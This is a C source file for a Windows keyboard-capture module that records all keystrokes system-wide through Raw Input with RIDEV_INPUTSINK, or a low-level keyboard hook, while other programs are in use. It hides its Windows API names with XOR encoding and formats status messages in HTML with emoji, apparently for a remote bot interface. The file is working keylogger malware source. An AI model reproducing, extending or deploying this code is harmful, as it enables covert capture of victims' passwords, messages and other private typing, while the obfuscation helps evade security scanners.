/*
 * Copyright (C) 2026 Antonio Ricciardi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "keyboard.h"
#include "keyboard_output.h"
#include "../logging/logging.h"
#include "../runtime/runtime.h"

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static HANDLE listener_thread;
static DWORD listener_thread_id;
static int listener_started;
static volatile int stopping;

#ifdef C2T_USE_LEGACY_KEYBOARD_HOOK
static HHOOK keyboard_hook;
#else
static HWND raw_input_hwnd;
static const wchar_t RAW_INPUT_CLASS_NAME[] = L"C2T_RawInputListenerWindow";
#endif

typedef DWORD (WINAPI *pfn_GetWindowThreadProcessId)(HWND hWnd, LPDWORD lpdwProcessId);
typedef HKL (WINAPI *pfn_GetKeyboardLayout)(DWORD idThread);

static inline void c2t_xor_decode(char *dest, const unsigned char *src, size_t len, unsigned char key)
{
    for (size_t i = 0; i < len; ++i) {
        dest[i] = (char)(src[i] ^ key);
    }
    dest[len] = '\0';
}

static DWORD c2t_GetWindowThreadProcessId(HWND hWnd, LPDWORD lpdwProcessId)
{
    static pfn_GetWindowThreadProcessId p_func = nullptr;
    if (!p_func) {
        static const unsigned char enc_u32[] = {47, 41, 63, 40, 105, 104, 116, 62, 54, 54};
        static const unsigned char enc_fn[] = {29, 63, 46, 13, 51, 52, 62, 53, 45, 14, 50, 40, 63, 59, 62, 10, 40, 53, 57, 63, 41, 41, 19, 62};
        char u32_buf[16];
        char fn_buf[32];
        c2t_xor_decode(u32_buf, enc_u32, sizeof(enc_u32), 0x5A);
        c2t_xor_decode(fn_buf, enc_fn, sizeof(enc_fn), 0x5A);
        HMODULE hUser32 = GetModuleHandleA(u32_buf);
        if (hUser32) p_func = (pfn_GetWindowThreadProcessId)(void*)GetProcAddress(hUser32, fn_buf);
    }
    if (p_func) return p_func(hWnd, lpdwProcessId);
    return 0;
}

static HKL c2t_GetKeyboardLayout(DWORD idThread)
{
    static pfn_GetKeyboardLayout p_func = nullptr;
    if (!p_func) {
        static const unsigned char enc_u32[] = {47, 41, 63, 40, 105, 104, 116, 62, 54, 54};
        static const unsigned char enc_fn[] = {29, 63, 46, 17, 63, 35, 56, 53, 59, 40, 62, 22, 59, 35, 53, 47, 46};
        char u32_buf[16];
        char fn_buf[32];
        c2t_xor_decode(u32_buf, enc_u32, sizeof(enc_u32), 0x5A);
        c2t_xor_decode(fn_buf, enc_fn, sizeof(enc_fn), 0x5A);
        HMODULE hUser32 = GetModuleHandleA(u32_buf);
        if (hUser32) p_func = (pfn_GetKeyboardLayout)(void*)GetProcAddress(hUser32, fn_buf);
    }
    if (p_func) return p_func(idThread);
    return nullptr;
}

static void process_windows_key_event(DWORD vk, DWORD scan_code, [[maybe_unused]] int is_extended)
{
    if (vk == 0 || vk == 255)
        return;

    /* Ignore standalone modifier keydown events so they don't produce empty labels */
    if (vk == VK_LCONTROL || vk == VK_RCONTROL || vk == VK_CONTROL ||
        vk == VK_LMENU || vk == VK_RMENU || vk == VK_MENU ||
        vk == VK_LSHIFT || vk == VK_RSHIFT || vk == VK_SHIFT ||
        vk == VK_LWIN || vk == VK_RWIN) {
        return;
    }

    int ctrl_down = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
    int shift_down = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    int alt_down = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
    int win_down = (GetAsyncKeyState(VK_LWIN) & 0x8000) != 0 ||
                   (GetAsyncKeyState(VK_RWIN) & 0x8000) != 0;

    char key_label[64] = {0};
    int is_special = 0;
    int is_printable = 0;

    if (vk >= VK_F1 && vk <= VK_F24) {
        snprintf(key_label, sizeof(key_label), "F%lu", (unsigned long)(vk - VK_F1 + 1));
        is_special = 1;
    } else {
        switch (vk) {
        case VK_RETURN:
            key_label[0] = '\n';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case VK_SPACE:
            key_label[0] = ' ';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case VK_TAB:
            key_label[0] = '\t';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case VK_BACK:
            keyboard_output_backspace();
            break;
        case VK_ESCAPE:
            snprintf(key_label, sizeof(key_label), "ESC");
            is_special = 1;
            break;
        case VK_DELETE:
            snprintf(key_label, sizeof(key_label), "Del");
            is_special = 1;
            break;
        case VK_INSERT:
            snprintf(key_label, sizeof(key_label), "Ins");
            is_special = 1;
            break;
        case VK_HOME:
            snprintf(key_label, sizeof(key_label), "Home");
            is_special = 1;
            break;
        case VK_END:
            snprintf(key_label, sizeof(key_label), "End");
            is_special = 1;
            break;
        case VK_PRIOR:
            snprintf(key_label, sizeof(key_label), "PgUp");
            is_special = 1;
            break;
        case VK_NEXT:
            snprintf(key_label, sizeof(key_label), "PgDn");
            is_special = 1;
            break;
        case VK_LEFT:
            snprintf(key_label, sizeof(key_label), "Left");
            is_special = 1;
            break;
        case VK_UP:
            snprintf(key_label, sizeof(key_label), "Up");
            is_special = 1;
            break;
        case VK_RIGHT:
            snprintf(key_label, sizeof(key_label), "Right");
            is_special = 1;
            break;
        case VK_DOWN:
            snprintf(key_label, sizeof(key_label), "Down");
            is_special = 1;
            break;
        case VK_SNAPSHOT:
            snprintf(key_label, sizeof(key_label), "PrtScn");
            is_special = 1;
            break;
        case VK_PAUSE:
            snprintf(key_label, sizeof(key_label), "Pause");
            is_special = 1;
            break;
        case VK_SCROLL:
            snprintf(key_label, sizeof(key_label), "ScrollLock");
            is_special = 1;
            break;
        case VK_NUMLOCK:
            snprintf(key_label, sizeof(key_label), "NumLock");
            is_special = 1;
            break;
        default: {
            BYTE key_state[256] = {0};
            if (shift_down) key_state[VK_SHIFT] = 0x80;
            if (ctrl_down) key_state[VK_CONTROL] = 0x80;
            if (alt_down) key_state[VK_MENU] = 0x80;
            if (GetKeyState(VK_CAPITAL) & 0x0001) key_state[VK_CAPITAL] = 0x01;

            static HWND cached_fg_wnd = nullptr;
            static DWORD cached_fg_thread = 0;
            static HKL cached_hkl = nullptr;

            HWND fg_wnd = GetForegroundWindow();
            if (fg_wnd != cached_fg_wnd) {
                cached_fg_wnd = fg_wnd;
                cached_fg_thread = fg_wnd ? c2t_GetWindowThreadProcessId(fg_wnd, nullptr) : 0;
                cached_hkl = cached_fg_thread ? c2t_GetKeyboardLayout(cached_fg_thread) : c2t_GetKeyboardLayout(0);
            }
            HKL hkl = cached_hkl;

            WCHAR unicode_buf[8] = {0};
            int count = ToUnicodeEx(vk, scan_code, key_state, unicode_buf, 4, 0, hkl);
            if (count > 0) {
                int utf8_bytes = WideCharToMultiByte(CP_UTF8, 0, unicode_buf, count,
                                                     key_label, sizeof(key_label) - 1, nullptr, nullptr);
                if (utf8_bytes > 0) {
                    key_label[utf8_bytes] = '\0';
                    is_printable = 1;
                }
            }
            break;
        }
        }
    }

    if (is_special || is_printable) {
        int is_altgr = (ctrl_down && alt_down) || ((GetAsyncKeyState(VK_RMENU) & 0x8000) != 0);
        int has_modifier = (ctrl_down && !is_altgr) || (alt_down && !is_altgr) || win_down;
        if (has_modifier && key_label[0] != '\n') {
            if (keyboard_get_shortcuts_enabled()) {
                char mod_buf[96];
                int offset = snprintf(mod_buf, sizeof(mod_buf), "[");
                if (ctrl_down) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Ctrl+");
                if (alt_down) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Alt+");
                if (win_down) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Win+");
                if (shift_down && !is_printable) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Shift+");
                offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "%s]", key_label);
                if (offset > 0 && (size_t)offset < sizeof(mod_buf)) {
                    keyboard_output_append(mod_buf, (size_t)offset);
                }
            }
        } else if (is_special) {
            if (keyboard_get_shortcuts_enabled()) {
                char spec_buf[48];
                int spec_len = snprintf(spec_buf, sizeof(spec_buf), "[%s]", key_label);
                if (spec_len > 0) {
                    keyboard_output_append(spec_buf, (size_t)spec_len);
                }
            }
        } else if (is_printable) {
            keyboard_output_append(key_label, strlen(key_label));
        }
    }
}

#ifdef C2T_USE_LEGACY_KEYBOARD_HOOK
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        process_windows_key_event(kbd->vkCode, kbd->scanCode, (kbd->flags & LLKHF_EXTENDED) != 0);
    }
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}
#else
static LRESULT CALLBACK RawInputWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    if (uMsg == WM_INPUT) {
        UINT dwSize = 0;
        if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, nullptr, &dwSize, sizeof(RAWINPUTHEADER)) == 0 && dwSize > 0) {
            BYTE stack_buf[256];
            BYTE *buf = (dwSize <= sizeof(stack_buf)) ? stack_buf : (BYTE *)malloc(dwSize);
            if (buf) {
                if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buf, &dwSize, sizeof(RAWINPUTHEADER)) == dwSize) {
                    RAWINPUT *raw = (RAWINPUT *)buf;
                    if (raw->header.dwType == RIM_TYPEKEYBOARD) {
                        RAWKEYBOARD *kb = &raw->data.keyboard;
                        if ((kb->Flags & RI_KEY_BREAK) == 0) {
                            process_windows_key_event(kb->VKey, kb->MakeCode, (kb->Flags & RI_KEY_E0) != 0);
                        }
                    }
                }
                if (buf != stack_buf) {
                    free(buf);
                }
            }
        }
        return DefWindowProcW(hwnd, uMsg, wParam, lParam);
    }
    return DefWindowProcW(hwnd, uMsg, wParam, lParam);
}
#endif

static DWORD WINAPI listener_worker([[maybe_unused]] void *context)
{
    listener_thread_id = GetCurrentThreadId();

#ifdef C2T_USE_LEGACY_KEYBOARD_HOOK
    keyboard_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                      GetModuleHandleW(nullptr), 0);
    if (!keyboard_hook) {
        c2t_log_error("keyboard", "SetWindowsHookExW failed (error %lu)", GetLastError());
        return 1;
    }
    c2t_log_info("keyboard", "Windows low-level keyboard hook active (legacy)");
#else
    HINSTANCE hInst = GetModuleHandleW(nullptr);
    WNDCLASSEXW wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = RawInputWndProc;
    wc.hInstance = hInst;
    wc.lpszClassName = RAW_INPUT_CLASS_NAME;
    (void)RegisterClassExW(&wc);

    raw_input_hwnd = CreateWindowExW(0, RAW_INPUT_CLASS_NAME, L"C2T_RawInput",
                                     0, 0, 0, 0, 0, HWND_MESSAGE, nullptr, hInst, nullptr);
    if (!raw_input_hwnd) {
        c2t_log_error("keyboard", "CreateWindowExW (HWND_MESSAGE) failed (error %lu)", GetLastError());
        UnregisterClassW(RAW_INPUT_CLASS_NAME, hInst);
        return 1;
    }

    RAWINPUTDEVICE rid = {0};
    rid.usUsagePage = 0x01; /* HID_USAGE_PAGE_GENERIC */
    rid.usUsage = 0x06;     /* HID_USAGE_GENERIC_KEYBOARD */
    rid.dwFlags = RIDEV_INPUTSINK;
    rid.hwndTarget = raw_input_hwnd;

    if (!RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE))) {
        c2t_log_error("keyboard", "RegisterRawInputDevices failed (error %lu)", GetLastError());
        DestroyWindow(raw_input_hwnd);
        raw_input_hwnd = nullptr;
        UnregisterClassW(RAW_INPUT_CLASS_NAME, hInst);
        return 1;
    }
    c2t_log_info("keyboard", "Windows Raw Input keyboard listener active (RIDEV_INPUTSINK)");
#endif

    MSG msg;
    while (!stopping && !c2t_runtime_stop_requested()) {
        BOOL res = PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE);
        if (res > 0) {
            if (msg.message == WM_QUIT)
                break;
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        } else {
            MsgWaitForMultipleObjects(0, nullptr, FALSE, 200, QS_ALLINPUT);
        }
    }

#ifdef C2T_USE_LEGACY_KEYBOARD_HOOK
    if (keyboard_hook) {
        UnhookWindowsHookEx(keyboard_hook);
        keyboard_hook = nullptr;
    }
#else
    RAWINPUTDEVICE rid_remove = {0};
    rid_remove.usUsagePage = 0x01;
    rid_remove.usUsage = 0x06;
    rid_remove.dwFlags = RIDEV_REMOVE;
    rid_remove.hwndTarget = nullptr;
    RegisterRawInputDevices(&rid_remove, 1, sizeof(RAWINPUTDEVICE));

    if (raw_input_hwnd) {
        DestroyWindow(raw_input_hwnd);
        raw_input_hwnd = nullptr;
    }
    UnregisterClassW(RAW_INPUT_CLASS_NAME, hInst);
#endif

    keyboard_output_flush();
    return 0;
}

int keyboard_listen(void)
{
    return (int)listener_worker(nullptr);
}

int keyboard_listener_init(void)
{
    if (listener_started)
        return 1;

    stopping = 0;
    listener_thread = CreateThread(nullptr, 0, listener_worker, nullptr, 0, &listener_thread_id);
    listener_started = (listener_thread != nullptr);

    if (!listener_started) {
        c2t_log_error("keyboard", "Unable to start Windows keyboard listener thread");
    }
    return listener_started;
}

void keyboard_listener_cleanup(void)
{
    if (!listener_started)
        return;

    stopping = 1;
    if (listener_thread_id != 0) {
        PostThreadMessageW(listener_thread_id, WM_QUIT, 0, 0);
    }
    WaitForSingleObject(listener_thread, INFINITE);
    CloseHandle(listener_thread);
    listener_started = 0;
}

static char windows_selected_target[128] = "all";

int keyboard_get_device_list(char *buffer, size_t max_len)
{
    if (!buffer || max_len == 0) return 0;
#ifdef C2T_USE_LEGACY_KEYBOARD_HOOK
    const char *backend = "WH_KEYBOARD_LL (Legacy Windows Hook)";
#else
    const char *backend = "Raw Input (RegisterRawInputDevices, RIDEV_INPUTSINK)";
#endif
    snprintf(buffer, max_len,
             "⌨️ <b>Windows Keyboard Devices:</b>\n\n"
             "• <b>[0]</b> <code>%s</code> — 🟢 <b>ACTIVE</b>\n\n"
             "🎯 <b>Current Target:</b> <code>%s</code>", backend, windows_selected_target);
    return 1;
}

int keyboard_select_device(const char *target)
{
    if (!target || !*target || strcmp(target, "all") == 0 || strcmp(target, "*") == 0) {
        snprintf(windows_selected_target, sizeof(windows_selected_target), "all");
    } else {
        snprintf(windows_selected_target, sizeof(windows_selected_target), "%s", target);
    }
    return 1;
}

void keyboard_get_selected_target(char *buffer, size_t max_len)
{
    if (buffer && max_len > 0) {
        snprintf(buffer, max_len, "%s", windows_selected_target);
    }
}

int keyboard_get_device_count(void)
{
    return 1;
}

int keyboard_set_layout([[maybe_unused]] const char *layout_name)
{
    /* On Windows, layout is tracked automatically per active window via ToUnicodeEx */
    return 1;
}

void keyboard_get_layout(char *buffer, size_t max_len)
{
    if (!buffer || max_len == 0) return;
    HWND fg_wnd = GetForegroundWindow();
    DWORD fg_thread = fg_wnd ? c2t_GetWindowThreadProcessId(fg_wnd, nullptr) : 0;
    HKL hkl = fg_thread ? c2t_GetKeyboardLayout(fg_thread) : c2t_GetKeyboardLayout(0);
    unsigned short lang_id = (unsigned short)((uintptr_t)hkl & 0xFFFF);
    char lang_name[128] = {0};
    if (GetLocaleInfoA(MAKELCID(lang_id, SORT_DEFAULT), LOCALE_SLANGUAGE, lang_name, sizeof(lang_name)) > 0) {
        snprintf(buffer, max_len, "🪟 Windows Native (%s, 0x%04X)", lang_name, lang_id);
    } else {
        snprintf(buffer, max_len, "🪟 Windows Native (Auto, 0x%04X)", lang_id);
    }
}

void keyboard_get_available_layouts(char *buffer, size_t max_len)
{
    if (!buffer || max_len == 0) return;
    snprintf(buffer, max_len,
             "🌐 <b>Windows Keyboard Layout:</b>\n"
             "• Windows automatically maps keystrokes using the active application's layout in real-time.\n");
}
#endif
